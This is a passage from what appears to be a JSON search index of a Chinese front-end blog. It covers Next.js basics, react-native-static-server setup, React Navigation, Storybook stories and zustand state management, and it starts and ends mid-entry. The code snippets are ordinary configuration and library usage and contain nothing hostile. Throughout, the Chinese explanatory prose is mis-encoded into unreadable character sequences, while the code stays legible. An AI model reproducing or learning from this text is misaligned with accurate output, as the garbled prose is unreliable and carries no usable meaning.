çš„æ–‡ä»¶å¤¹ä¸‹æä¾›ã€‚ ç„¶åå¯ä»¥ä½¿ç”¨æ ¹ URL åœ¨ä¸åŒé¡µé¢ä¸Šçš„ \u0026lt;img\u0026gt; æ ‡è®°ä»£ç ä¸­å¼•ç”¨ç›¸åŒçš„å›¾åƒã€‚ ä¾‹å¦‚ï¼Œsrc=/logo.pngã€‚\nè‡ªåŠ¨å›¾åƒä¼˜åŒ– Next.js å®ç°äº†è‡ªåŠ¨å›¾åƒä¼˜åŒ–ï¼Œå®ƒå…è®¸åœ¨æµè§ˆå™¨æ”¯æŒæ—¶ä»¥ç°ä»£æ ¼å¼è°ƒæ•´å›¾åƒå¤§å°ã€ä¼˜åŒ–å’Œæä¾›å›¾åƒã€‚ å› æ­¤ï¼Œåœ¨éœ€è¦æ—¶ä¼šé’ˆå¯¹è¾ƒå°çš„è§†å£è°ƒæ•´å¤§å›¾åƒçš„å¤§å°ã€‚\nå›¾åƒä¼˜åŒ–æ˜¯é€šè¿‡å¯¼å…¥ Next.js Image ç»„ä»¶æ¥å®ç°çš„ï¼Œè¯¥ç»„ä»¶æ˜¯ HTML \u0026lt;img\u0026gt; å…ƒç´ çš„æ‰©å±•ã€‚ è¦ä½¿ç”¨ Image ç»„ä»¶ï¼Œåº”æŒ‰å¦‚ä¸‹æ–¹å¼å¯¼å…¥ã€‚\nimport Image from \u0026#39;next/image\u0026#39; å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç åœ¨é¡µé¢ä¸Šæä¾›å›¾åƒç»„ä»¶ã€‚\n\u0026lt;Image src=\u0026#34;/logo.png\u0026#34; alt=\u0026#34;Logo\u0026#34; width={500} height={500} /\u0026gt; è·¯ç”± Next.js æ”¯æŒé€šè¿‡ pages ç›®å½•è¿›è¡Œè·¯ç”±ã€‚ æ­¤ç›®å½•æˆ–å…¶åµŒå¥—å­ç›®å½•ä¸­çš„æ¯ä¸ª .js æ–‡ä»¶éƒ½æˆä¸ºå…·æœ‰ç›¸åº”è·¯ç”±çš„é¡µé¢ã€‚\nNext.js è¿˜æ”¯æŒä½¿ç”¨å‘½åå‚æ•°åˆ›å»ºåŠ¨æ€è·¯ç”±ï¼Œå…¶ä¸­æ˜¾ç¤ºçš„å®é™…æ–‡æ¡£ç”±å‚æ•°çš„å€¼å†³å®šã€‚\nä¾‹å¦‚ï¼Œé¡µé¢ pages/products/[pid].js å°†åŒ¹é… /post/1 ä¹‹ç±»çš„è·¯ç”±ï¼Œå…¶ä¸­ pid=1 ä½œä¸ºæŸ¥è¯¢å‚æ•°ä¹‹ä¸€ã€‚\nNext.js ä¹Ÿæ”¯æŒé“¾æ¥åˆ°å…¶ä»–é¡µé¢ä¸Šçš„è¿™äº›åŠ¨æ€è·¯ç”±\nä»£ç æ‹†åˆ† ä»£ç æ‹†åˆ†ç¡®ä¿ä»…å°†æ‰€éœ€çš„ JavaScript å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œè¿™æœ‰åŠ©äºæé«˜æ€§èƒ½ã€‚\nNext.js æ”¯æŒä¸¤ç§ç±»å‹çš„ä»£ç æ‹†åˆ†ã€‚\n  åŸºäºè·¯ç”±ï¼šè¿™æ˜¯åœ¨ Next.js ä¸­é»˜è®¤å®ç°çš„ã€‚ å½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªè·¯ç”±æ—¶ï¼ŒNext.js åªå‘é€åˆå§‹è·¯ç”±æ‰€éœ€çš„ä»£ç ã€‚ å½“ç”¨æˆ·æµè§ˆåº”ç”¨ç¨‹åºæ—¶ï¼Œä¼šæ ¹æ®éœ€è¦ä¸‹è½½å…¶ä»–å—ã€‚ è¿™é™åˆ¶äº†éœ€è¦ä¸€æ¬¡è§£æå’Œç¼–è¯‘çš„ä»£ç é‡ï¼Œä»è€Œç¼©çŸ­äº†é¡µé¢åŠ è½½æ—¶é—´ã€‚\n  åŸºäºç»„ä»¶ï¼šè¿™ç§ç±»å‹çš„ä»£ç æ‹†åˆ†å…è®¸å°†å¤§å‹ç»„ä»¶æ‹†åˆ†ä¸ºå•ç‹¬çš„å—ï¼Œå¯ä»¥åœ¨éœ€è¦æ—¶å»¶è¿ŸåŠ è½½ã€‚ Next.js é€šè¿‡åŠ¨æ€ import() æ”¯æŒåŸºäºç»„ä»¶çš„ä»£ç æ‹†åˆ†ã€‚ è¿™å…è®¸æ‚¨åŠ¨æ€å¯¼å…¥ JavaScript æ¨¡å—ï¼ˆåŒ…æ‹¬ React ç»„ä»¶ï¼‰å¹¶å°†æ¯ä¸ªå¯¼å…¥ä½œä¸ºå•ç‹¬çš„å—åŠ è½½ã€‚\n  \rå¼€å§‹ Next.js çš„æ–¹å¼ Next.js å¯ä»¥å®‰è£…åœ¨ä»»ä½•å¸¦æœ‰ Node.js 10.13 æˆ–æ›´é«˜ç‰ˆæœ¬çš„ Linuxã€Windows æˆ– Mac OS ä¸Šã€‚ è‡ªåŠ¨å’Œæ‰‹åŠ¨è®¾ç½®é€‰é¡¹å‡å¯ç”¨ã€‚\nä½¿ç”¨ create-next-app è‡ªåŠ¨è®¾ç½®\nyarn create next-app --typescript å®‰è£…åï¼Œå¯ä»¥è¿è¡Œå¼€å‘æœåŠ¡å™¨å¹¶è®¿é—® http://localhost:3000 ä¸Šçš„é¡µé¢ã€‚\né€šè¿‡å¯¹ Next.js çš„ä»‹ç»ï¼Œç°åœ¨å¯ä»¥ç ”ç©¶ä¸åŒæ¨¡å¼çš„å®ç°ã€‚\n\rçŸ¥è¯†ç‚¹  é¢„æ¸²æŸ“ æ°´åˆä½œç”¨ è·¯ç”± getStaticProps getStaticPaths é™æ€æ–‡ä»¶æœåŠ¡ public Image è·¯ç”± ä»£ç æ‹†åˆ†  ","description":"Vercel çš„æ··åˆ React åº”ç”¨ç¨‹åºæ¡†æ¶","id":61,"section":"react-patterns","tags":null,"title":"Next.js æ¦‚è¿°","uri":"https://codthing.github.io/react-patterns/render-patterns/overview-next/"},{"content":"æ­å»ºæœ¬åœ°é™æ€æœåŠ¡å™¨å’Œä½¿ç”¨æœ¬åœ°é™æ€èµ„æºï¼Œ éœ€è¦åœ¨expoå¼¹å‡ºçš„è£¸æ¼å·¥ä½œæµä¸­\nStep1. é…ç½®androidæ–‡ä»¶ /android/app/build.gradle ä¸­æ·»åŠ  sourceSets { main { assets.srcDirs = ['src/main/assets','../../assets']}}\nandroid {\rcompileSdkVersion rootProject.ext.compileSdkVersion\rcompileOptions {\rsourceCompatibility JavaVersion.VERSION_1_8\rtargetCompatibility JavaVersion.VERSION_1_8\r}\rdefaultConfig {\rapplicationId \u0026#39;com.fengmo.GA08\u0026#39;\rminSdkVersion rootProject.ext.minSdkVersion\rtargetSdkVersion rootProject.ext.targetSdkVersion\rversionCode 1\rversionName \u0026#34;1.0.0\u0026#34;\r}\rsplits {\rabi {\rreset()\renable enableSeparateBuildPerCPUArchitecture\runiversalApk false // If true, also generate a universal APK\rinclude \u0026#34;armeabi-v7a\u0026#34;, \u0026#34;x86\u0026#34;, \u0026#34;arm64-v8a\u0026#34;, \u0026#34;x86_64\u0026#34;\r}\r}\rsigningConfigs {\rdebug {\rstoreFile file(\u0026#39;debug.keystore\u0026#39;)\rstorePassword \u0026#39;android\u0026#39;\rkeyAlias \u0026#39;androiddebugkey\u0026#39;\rkeyPassword \u0026#39;android\u0026#39;\r}\r}\rbuildTypes {\rdebug {\rsigningConfig signingConfigs.debug\r}\rrelease {\r// Caution! In production, you need to generate your own keystore file.\r// see https://reactnative.dev/docs/signed-apk-android.\rsigningConfig signingConfigs.debug\rminifyEnabled enableProguardInReleaseBuilds\rproguardFiles getDefaultProguardFile(\u0026#34;proguard-android.txt\u0026#34;), \u0026#34;proguard-rules.pro\u0026#34;\r}\r}\r// applicationVariants are e.g. debug, release\rapplicationVariants.all { variant -\u0026gt;\rvariant.outputs.each { output -\u0026gt;\r// For each separate APK per architecture, set a unique version code as described here:\r// https://developer.android.com/studio/build/configure-apk-splits.html\rdef versionCodes = [\u0026#34;armeabi-v7a\u0026#34;: 1, \u0026#34;x86\u0026#34;: 2, \u0026#34;arm64-v8a\u0026#34;: 3, \u0026#34;x86_64\u0026#34;: 4]\rdef abi = output.getFilter(OutputFile.ABI)\rif (abi != null) { // null for the universal-debug, universal-release variants\routput.versionCodeOverride =\rversionCodes.get(abi) * 1048576 + defaultConfig.versionCode\r}\r}\r}\r+ sourceSets { main { assets.srcDirs = [\u0026#39;src/main/assets\u0026#39;,\u0026#39;../../assets\u0026#39;]}}\r} Step2. å®‰è£…é™æ€æœåŠ¡å™¨ yarn add react-native-static-server Step3. å®‰è£…æ–‡ä»¶ç³»ç»Ÿ yarn add react-native-fs Step4. å®‰è£…htmlæ¸²æŸ“ç»„ä»¶ expo install react-native-webview Step5. é¡¹ç›®æ ¹ç›®å½•ä¸­æ–°å»ºtype.d.ts declare module \u0026#39;react-native-static-server\u0026#39;\rdeclare module \u0026#39;react-native-fs\u0026#39; Step6. assets/www ä¸­æ”¾ç½®é™æ€htmlé¡¹ç›®æ–‡ä»¶ Step7. å¯åŠ¨æœ¬åœ°å¼€å‘æœåŠ¡å™¨ yarn start Step8. å°†å¼€å‘apkæ‰“åŒ…åˆ°æ¨¡æ‹Ÿå™¨æµ‹è¯•æˆæœ yarn android Step9. å¦‚æœæ‰“åŒ…åçš„apkæ‰“å¼€é¡µé¢ä¸æ˜¾ç¤º  Domain: undefine\nError Code:-1\n éœ€è¦åœ¨ android/app/src/main/AndroidManifest.xml ä¸­çš„\u0026lt;application\u0026gt;ä¸­æ·»åŠ  android:usesCleartextTraffic=\u0026quot;true\u0026quot;\n\u0026lt;application android:name=\u0026#34;.MainApplication\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; + android:usesCleartextTraffic=\u0026#34;true\u0026#34; android:roundIcon=\u0026#34;@mipmap/ic_launcher_round\u0026#34; android:allowBackup=\u0026#34;true\u0026#34; android:theme=\u0026#34;@style/AppTheme\u0026#34;\r\u0026gt;  ä»¥ä¸Šåªæ˜¯æµç¨‹æ­¥éª¤ï¼Œå…·ä½“é€»è¾‘ä»£ç æœªåœ¨è¿™é‡Œå±•ç¤º\n æ³¨æ„ ä¿®æ”¹é™æ€æ–‡ä»¶åï¼Œå¦‚æœyarn androidæŠ¥é”™\n Unable to delete directory\n éœ€è¦å…ˆåˆ é™¤æœ¬åœ° android\\app\\build\\intermediates\\merged_assets\\debug\\out\\ ä¸­çš„æ–‡ä»¶ï¼Œå†yarn androidæ‰ä¸ä¼šæŠ¥é”™ã€‚\n","description":"","id":62,"section":"react-native","tags":null,"title":"react-native-static-server","uri":"https://codthing.github.io/react-native/react-native/react-native-static-server/"},{"content":"ä¸€ã€goBack()è¿”å›ä¸Šä¸€å±å¹•åˆ·æ–°çŠ¶æ€çš„æ–¹æ³• é€šè¿‡è·¯ç”±ä¼ é€’æ•°æ®æ—¶ï¼Œå½“å‘åŒä¸€ä¸ªé¡µé¢ï¼ˆè¯¦æƒ…é¡µï¼‰ä¼ é€’ä¸€äº›å”¯ä¸€æ•°æ®ï¼Œä½¿ç”¨pushï¼Œè€Œä¸æ˜¯ navigateï¼Œè¿™æ ·æ‰èƒ½ä¿è¯æ•´ä¸ªç»„ä»¶é‡æ–°æ‰§è¡Œã€‚\n","description":"","id":63,"section":"react-native","tags":null,"title":"React-Navigation","uri":"https://codthing.github.io/react-native/expo/react-navigation/"},{"content":"Story ä»‹ç» Storyï¼ˆæ•…äº‹ï¼‰æ•è· UI ç»„ä»¶çš„å‘ˆç°çŠ¶æ€ã€‚ å¼€å‘äººå‘˜ä¸ºæ¯ä¸ªç»„ä»¶ç¼–å†™å¤šä¸ªæ•…äº‹ï¼Œæè¿°ç»„ä»¶å¯ä»¥æ”¯æŒçš„æ‰€æœ‰â€œæœ‰è¶£â€çŠ¶æ€ã€‚\næ¯ä¸ªç»„ä»¶éƒ½æœ‰ä¸€ç»„æ•…äº‹ï¼Œæ˜¾ç¤ºå®ƒæ”¯æŒçš„çŠ¶æ€ã€‚\nå¯ä»¥åœ¨ UI ä¸­æµè§ˆæ•…äº‹ï¼Œå¹¶åœ¨ä»¥ .stories.js æˆ– .stories.ts ç»“å°¾çš„æ–‡ä»¶ä¸­æŸ¥çœ‹æ•…äº‹èƒŒåçš„ä»£ç ã€‚\nè¿™äº›æ•…äº‹ä»¥ç»„ä»¶æ•…äº‹æ ¼å¼ (CSF) ç¼–å†™ï¼Œè¿™æ˜¯ä¸€ç§åŸºäº ES6 æ¨¡å—çš„æ ‡å‡†ï¼Œç”¨äºç¼–å†™ç»„ä»¶ç¤ºä¾‹ã€‚\nä» Button ç»„ä»¶å¼€å§‹ã€‚ æ•…äº‹æ˜¯æè¿°å¦‚ä½•å‘ˆç°ç›¸å…³ç»„ä»¶çš„å‡½æ•°ã€‚ ä»¥ä¸‹æ˜¯å¦‚ä½•åœ¨ Primary çŠ¶æ€ä¸‹æ¸²æŸ“ Button å¹¶å¯¼å‡ºä¸€ä¸ªåä¸º Primary çš„æ•…äº‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13  // Button.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { Button } from \u0026#39;./Button\u0026#39;; export default { title: \u0026#39;Button\u0026#39;, component: Button, } as ComponentMeta\u0026lt;typeof Button\u0026gt;; export const Primary: ComponentStory\u0026lt;typeof Button\u0026gt; = () =\u0026gt; \u0026lt;Button primary\u0026gt;Button\u0026lt;/Button\u0026gt;;   ç¼–å†™æ–‡æ¡£ï¼ˆå¯é€‰ï¼‰\n\u0026lt;!-- Button.stories.mdx --\u0026gt;\rimport { Meta, Story } from \u0026#39;@storybook/addon-docs\u0026#39;;\rimport { Button } from \u0026#39;./Button\u0026#39;;\r\u0026lt;Meta title=\u0026#34;Button\u0026#34; component={Button} /\u0026gt;\r# Button\r\u0026lt;Story name=\u0026#34;Primary\u0026#34;\u0026gt;\r\u0026lt;Button primary\u0026gt;Button\u0026lt;/Button\u0026gt;\r\u0026lt;/Story\u0026gt; é€šè¿‡åœ¨ Storybook ä¾§æ ä¸­å•å‡»å®ƒæ¥æŸ¥çœ‹å‘ˆç°çš„ Buttonã€‚\n\rargs å¯ä»¥è¿›ä¸€æ­¥æ”¹è¿›ä¸Šè¿°æ•…äº‹å®šä¹‰ä»¥åˆ©ç”¨ Storybook çš„ args æ¦‚å¿µã€‚ Args ä»¥æœºå™¨å¯è¯»çš„æ–¹å¼æè¿° Button çš„å‚æ•°ã€‚\nå®ƒé‡Šæ”¾äº† Storybook åŠ¨æ€æ”¹å˜å’Œæ’°å†™è®ºç‚¹çš„è¶…èƒ½åŠ›ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // Button.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { Button, ButtonProps } from \u0026#39;./Button\u0026#39;; export default { title: \u0026#39;Button\u0026#39;, component: Button, } as ComponentMeta\u0026lt;typeof Button\u0026gt;; //ğŸ‘‡ æˆ‘ä»¬åˆ›å»ºäº† args å¦‚ä½•æ˜ å°„åˆ°æ¸²æŸ“çš„ templateï¼ˆæ¨¡æ¿ï¼‰ const Template: ComponentStory\u0026lt;typeof Button\u0026gt; = (args) =\u0026gt; \u0026lt;Button {...args} /\u0026gt;; export const Primary = Template.bind({}); Primary.args = { primary: true, label: \u0026#39;Button\u0026#39;, };   ç¼–å†™æ–‡æ¡£ï¼ˆå¯é€‰ï¼‰\n\u0026lt;!-- Button.stories.mdx--\u0026gt;\rimport { Meta, Story } from \u0026#39;@storybook/addon-docs\u0026#39;;\rimport { Button } from \u0026#39;./Button\u0026#39;;\r\u0026lt;Meta title=\u0026#34;Button\u0026#34; component={Button} /\u0026gt;\r\u0026lt;!-- ğŸ‘‡ æˆ‘ä»¬åˆ›å»ºäº† args å¦‚ä½•æ˜ å°„åˆ°æ¸²æŸ“çš„ templateï¼ˆæ¨¡æ¿ï¼‰ --\u0026gt;\rexport const Template = (args) =\u0026gt; \u0026lt;Button {...args} /\u0026gt;;\r\u0026lt;!-- ğŸ‘‡ æ¯ä¸ªæ•…äº‹é‡ç”¨è¯¥æ¨¡æ¿ --\u0026gt;\r\u0026lt;Story\rname=\u0026#34;Primary\u0026#34;\rargs={{\rprimary: true,\rlabel: \u0026#39;Button\u0026#39;,\r}}\u0026gt;\r{Template.bind({})}\r\u0026lt;/Story\u0026gt; ä¸¤ä¸ªæ•…äº‹ç¤ºä¾‹æ¸²æŸ“ç›¸åŒçš„å†…å®¹ï¼Œå› ä¸º Storybook åœ¨æ¸²æŸ“æœŸé—´å°†ç»™å®šçš„ args å±æ€§æä¾›ç»™æ•…äº‹ã€‚\nå¯ä»¥é€šè¿‡ args è·å¾—çœæ—¶çš„ä¾¿åˆ©ï¼š\n  æŒ‰é’®å›è°ƒè®°å½•åˆ° Action é€‰é¡¹å¡ä¸­ã€‚ å•å‡»ä»¥å°è¯•å®ƒ\n  æŒ‰é’®å‚æ•°å¯åœ¨ Controls é€‰é¡¹å¡ä¸­åŠ¨æ€ç¼–è¾‘ã€‚ è°ƒæ•´æ§ä»¶\n  \rç¼–è¾‘æ•…äº‹ Storybook å¯ä»¥è½»æ¾åœ°ä¸€æ¬¡å¤„ç†ä¸€ç§çŠ¶æ€ï¼ˆåˆåæ•…äº‹ï¼‰ä¸­çš„ä¸€ä¸ªç»„ä»¶ã€‚\nå½“ç¼–è¾‘ Button ä»£ç æˆ–æ•…äº‹æ—¶ï¼ŒStorybook å°†ç«‹å³åœ¨æµè§ˆå™¨ä¸­é‡æ–°å‘ˆç°ã€‚ æ— éœ€æ‰‹åŠ¨åˆ·æ–°ã€‚\næ›´æ–°ä¸»è¦æ•…äº‹çš„æ ‡ç­¾ï¼Œç„¶ååœ¨ Storybook ä¸­æŸ¥çœ‹æ›´æ”¹ã€‚\næ•…äº‹è¿˜æœ‰åŠ©äºæ£€æŸ¥ UI åœ¨æ›´æ”¹æ—¶æ˜¯å¦ç»§ç»­ä¿æŒæ­£ç¡®ã€‚\nButton ç»„ä»¶æœ‰å››ä¸ªæ•…äº‹ï¼Œåœ¨ä¸åŒçš„ç”¨ä¾‹ä¸­å±•ç¤ºå®ƒã€‚\nç°åœ¨æŸ¥çœ‹è¿™äº›æ•…äº‹ï¼Œä»¥ç¡®è®¤å¯¹ä¸»è¦çš„æ›´æ”¹æ²¡æœ‰åœ¨å…¶ä»–æ•…äº‹ä¸­å¼•å…¥æ— æ„çš„é”™è¯¯ã€‚\nåœ¨å¼€å‘æ—¶æ£€æŸ¥ç»„ä»¶çš„æ•…äº‹æœ‰åŠ©äºé˜²æ­¢æ„å¤–å›å½’ã€‚ ä¸ Storybook é›†æˆçš„å·¥å…·ä¹Ÿå¯ä»¥è‡ªåŠ¨åŒ–ã€‚\nç°åœ¨å·²ç»äº†è§£äº†æ•…äº‹çš„åŸºæœ¬ç»“æ„ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ Storybook çš„ UI æ¥å¼€å‘æ•…äº‹ã€‚\n\rçŸ¥è¯†ç‚¹   args\n  Action\n  Controls\n  ","description":"","id":64,"section":"react","tags":null,"title":"Story æ˜¯ä»€ä¹ˆï¼Ÿ","uri":"https://codthing.github.io/react/storybook/sb-started/sb-what/"},{"content":"zustand åŸºäº hooks çš„ apiï¼Œå°å‹ã€å¿«é€Ÿä¸”å¯æ‰©å±•çš„çŠ¶æ€ç®¡ç†è§£å†³æ–¹æ¡ˆã€‚\nä¸€ã€å®‰è£… yarn add zustand äºŒã€æœ€ç®€ä½¿ç”¨æ–¹æ³• Step1. åˆ›å»ºä¸€ä¸ª Store store æ˜¯ä¸€ä¸ªé’©å­ï¼ å¯ä»¥åœ¨é‡Œé¢æ”¾ä»»ä½•ä¸œè¥¿ï¼šåŸå§‹æ•°æ®ï¼ˆstringï¼Œnumberï¼Œbigintï¼Œbooleanï¼Œnullï¼‰ã€å¯¹è±¡ã€æ–¹æ³•ã€‚ set æ–¹æ³•åˆå¹¶çŠ¶æ€ã€‚\nimport create from \u0026#39;zustand\u0026#39;\rconst useCount = create(set =\u0026gt; ({\rcount: 0,\rplus: () =\u0026gt; set(state =\u0026gt; ({ count: state.count + 1 })),\rminus: () =\u0026gt; set(state =\u0026gt; ({ count: state.count - 1 })),\rreset: () =\u0026gt; set({ count: 0 })\r})) Step2. ç»‘å®šç»„ä»¶ function Counter() {\rconst count = useCount(state =\u0026gt; state.count)\rreturn \u0026lt;h1\u0026gt;{count}\u0026lt;/h1\u0026gt;\r}\rfunction Controls() {\rconst plus = useCount(state =\u0026gt; state.plus)\rconst minus= useCount(state =\u0026gt; state.minus)\rconst reset= useCount(state =\u0026gt; state.reset)\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;button onClick={plus}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={minus}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={reset}\u0026gt;é‡ç½®\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} äºŒã€å¼ºåˆ¶æ¸²æŸ“ç»„ä»¶ è®°ä½ï¼Œå®ƒä¼šå¯¼è‡´ç»„ä»¶åœ¨æ¯æ¬¡çŠ¶æ€æ›´æ”¹æ—¶æ¸²æŸ“ï¼\nconst state = useStore() ä¸‰ã€state æ›´æ–°æ¸²æŸ“ç»„ä»¶ åˆ‡ç‰‡çŠ¶æ€ï¼ˆslice stateï¼‰,å› ä¸ºstoreæ˜¯ä¸€ä¸ªåŸå­çŠ¶æ€ï¼Œå¯ä»¥å°†å®ƒåˆ‡åˆ†ä¸ºå¤šä¸ªæ ¼å­çŠ¶æ€ï¼Œä¾¿äºä»£ç ç®¡ç†ã€‚\n1. å•ä¸ª state æ›´æ–°æ¸²æŸ“ é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä»¥ä¸¥æ ¼ç›¸ç­‰ï¼ˆæ—§ === æ–°ï¼‰æ£€æµ‹æ›´æ”¹ï¼Œè¿™å¯¹äºåŸå­çŠ¶æ€é€‰æ‹©éå¸¸æœ‰æ•ˆã€‚\nconst nuts = useStore(state =\u0026gt; state.nuts)\rconst honey = useStore(state =\u0026gt; state.honey) 2. å¤šä¸ª state æ›´æ–°ï¼ˆæµ…å·®å¼‚ï¼‰æ¸²æŸ“ å¦‚æœæƒ³æ„é€ ä¸€ä¸ªå†…éƒ¨æœ‰å¤šä¸ª state-picks(çŠ¶æ€é€‰æ‹©) çš„å•ä¸ªå¯¹è±¡ï¼Œç±»ä¼¼äº redux çš„ mapStateToPropsï¼Œå¯ä»¥å‘Šè¯‰ zustand ä½ å¸Œæœ›é€šè¿‡ä¼ é€’shallowç›¸ç­‰å‡½æ•°æ¥å¯¹å¯¹è±¡è¿›è¡Œæµ…å·®å¼‚ã€‚\n1 2 3 4 5 6 7 8 9 10 11  import shallow from \u0026#39;zustand/shallow\u0026#39; // å¯¹è±¡é€‰æ‹©ï¼Œå½“ `state.nuts` æˆ– `state.honey` æ”¹å˜æ—¶é‡æ–°æ¸²æŸ“ç»„ä»¶ const { nuts, honey } = useStore(state =\u0026gt; ({ nuts: state.nuts, honey: state.honey }), shallow) // æ•°ç»„é€‰æ‹©ï¼Œå½“ `state.nuts` æˆ– `state.honey` æ”¹å˜æ—¶é‡æ–°æ¸²æŸ“ç»„ä»¶ const [nuts, honey] = useStore(state =\u0026gt; [state.nuts, state.honey], shallow) // æ˜ å°„é€‰æ‹©ï¼Œå½“ `state.treats` æŒ‰ `count` æˆ– `keys` é¡ºåºæ”¹å˜æ—¶é‡æ–°æ¸²æŸ“ç»„ä»¶ const treats = useStore(state =\u0026gt; Object.keys(state.treats), shallow)   3. è‡ªå®šä¹‰å‡½æ•°æ§åˆ¶æ¸²æŸ“ ä¸ºäº†æ›´å¥½åœ°æ§åˆ¶é‡æ–°æ¸²æŸ“ï¼Œå¯ä»¥æä¾›ä»»ä½•è‡ªå®šä¹‰çš„ç›¸ç­‰å‡½æ•°ã€‚\nconst treats = useStore(\rstate =\u0026gt; state.treats,\r(oldTreats, newTreats) =\u0026gt; compare(oldTreats, newTreats)\r) å››ã€è®°å¿†å¤„ç†å™¨ï¼ˆé¿å…é‡å¤è®¡ç®—ï¼‰ 1. useCallback() å¤„ç†å™¨ é€šå¸¸å»ºè®®ä½¿ç”¨ useCallback è®°å¿†å¤„ç†å™¨ã€‚ è¿™å°†é˜²æ­¢æ¯æ¬¡æ¸²æŸ“æ—¶è¿›è¡Œä¸å¿…è¦çš„è®¡ç®—ã€‚ å®ƒè¿˜å…è®¸ React åœ¨å¹¶å‘æ¨¡å¼ä¸‹ä¼˜åŒ–æ€§èƒ½ã€‚\nconst fruit = useStore(useCallback(state =\u0026gt; state.fruits[id], [id])) 2. ä¸ä¾èµ–äºä½œç”¨åŸŸçš„å¤„ç†å™¨ å¦‚æœä¸€ä¸ªå¤„ç†å™¨ä¸ä¾èµ–äºä½œç”¨åŸŸï¼Œå¯ä»¥åœ¨æ¸²æŸ“å‡½æ•°ä¹‹å¤–å®šä¹‰å®ƒä»¥è·å¾—ä¸€ä¸ªå›ºå®šçš„â€œå¼•ç”¨â€è€Œæ— éœ€ useCallbackã€‚\nconst selector = state =\u0026gt; state.berries\rfunction Component() {\rconst berries = useStore(selector)\r} äº”ã€è¦†ç›–stateï¼ˆæŠ¹å»ä¹‹å‰çš„stateï¼‰ set å‡½æ•°æœ‰ç¬¬äºŒä¸ªå‚æ•°ï¼Œé»˜è®¤ä¸º falseã€‚ å®ƒå°†å–ä»£stateæ¨¡å‹ï¼Œè€Œä¸æ˜¯åˆå¹¶ã€‚ æ³¨æ„å®ƒä¼šæŠ¹å»ä½ ä¾èµ–çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚actionsã€‚\n1 2 3 4 5 6 7 8 9  import omit from \u0026#34;lodash-es/omit\u0026#34; const useStore = create(set =\u0026gt; ({ salmon: 1, tuna: 2, deleteEverything: () =\u0026gt; set({ }, true), // æ¸…é™¤æ•´ä¸ªå­˜å‚¨ï¼ŒåŒ…æ‹¬æ“ä½œ  deleteTuna: () =\u0026gt; set(state =\u0026gt; omit(state, [\u0026#39;tuna\u0026#39;]), true) }))   å…­ã€å¼‚æ­¥æ“ä½œï¼ˆfetchè¯·æ±‚ï¼‰ è°ƒç”¨ set ï¼Œ zustand ä¸å…³å¿ƒæ“ä½œæ˜¯å¦å¼‚æ­¥ã€‚\nconst useStore = create(set =\u0026gt; ({\rgirls: {},\rfetch: async pond =\u0026gt; {\rconst response = await fetch(pond)\rset({ girls: await response.json() })\r}\r})) ä¸ƒã€ä» action ä¸­è¯»å– state é€šè¿‡getè®¿é—®çŠ¶æ€ã€‚\nconst useStore = create((set, get) =\u0026gt; ({\rname: \u0026#34;Lucy\u0026#34;,\raction: () =\u0026gt; {\rconst name= get().name\r// ...\r}\r}) å…«ã€åœ¨ React ç»„ä»¶ä¹‹å¤–è¯»å†™ state 1. è‡ªå®šä¹‰ hooks è¯»å†™ state æœ‰æ—¶éœ€è¦ä»¥éReactæ–¹å¼è®¿é—®çŠ¶æ€ï¼Œæˆ–å¯¹storeè¿›è¡Œæ“ä½œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  const useStore = create(() =\u0026gt; ({ paw: true, snout: true, fur: true })) // åœ¨Reactç»„ä»¶ä¹‹å¤–è·å–state const paw = useStore.getState().paw //true  // ä¾¦å¬æ‰€æœ‰æ›´æ”¹ï¼Œåœ¨æ¯æ¬¡æ›´æ”¹æ—¶åŒæ­¥è§¦å‘ const unsub = useStore.subscribe(console.log) // æ›´æ–°çŠ¶æ€ï¼Œå°†è§¦å‘ä¾¦å¬å™¨ useStore.setState({ paw: false }) // å–æ¶ˆè®¢é˜…ä¾¦å¬ unsub() // é”€æ¯å•†åº—ï¼ˆåˆ é™¤æ‰€æœ‰ä¾¦å¬å™¨ï¼‰ useStore.destroy() // å½“ç„¶å¯ä»¥åƒhookä¸€æ ·ä½¿ç”¨ function Component() { const paw = useStore(state =\u0026gt; state.paw)   2. ä½¿ç”¨è®¢é˜…å¤„ç†å™¨ï¼ˆä¸­é—´ä»¶ï¼‰ å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨å¤„ç†å™¨è®¢é˜…ï¼ŒsubscribeWithSelector ä¸­é—´ä»¶ä¼šæœ‰æ‰€å¸®åŠ©ã€‚\næœ‰äº†è¿™ä¸ªä¸­é—´ä»¶ï¼Œsubscribe æ¥å—ä¸€ä¸ªé¢å¤–çš„ç­¾åï¼š\nsubscribe(selector, callback, options?: { equalityFn, fireImmediately }): Unsubscribe 1 2 3 4 5 6 7 8 9 10 11 12  import { subscribeWithSelector } from \u0026#39;zustand/middleware\u0026#39; const useStore = create(subscribeWithSelector(() =\u0026gt; ({ paw: true, snout: true, fur: true }))) // è®¢é˜…çŠ¶æ€å€¼å˜åŒ– const unsub2 = useStore.subscribe(state =\u0026gt; state.paw, console.log) // è®¢é˜…ä¸Šä¸€ä¸ªçŠ¶æ€å€¼ const unsub3 = useStore.subscribe(state =\u0026gt; state.paw, (paw, previousPaw) =\u0026gt; console.log(paw, previousPaw)) // è®¢é˜…ä¸€ä¸ªå¯é€‰çš„æµ…å·®å¼‚æ–¹æ³• const unsub4 = useStore.subscribe(state =\u0026gt; [state.paw, state.fur], console.log, { equalityFn: shallow }) // è§£é™¤è®¢é˜… const unsub5 = useStore.subscribe(state =\u0026gt; state.paw, console.log, { 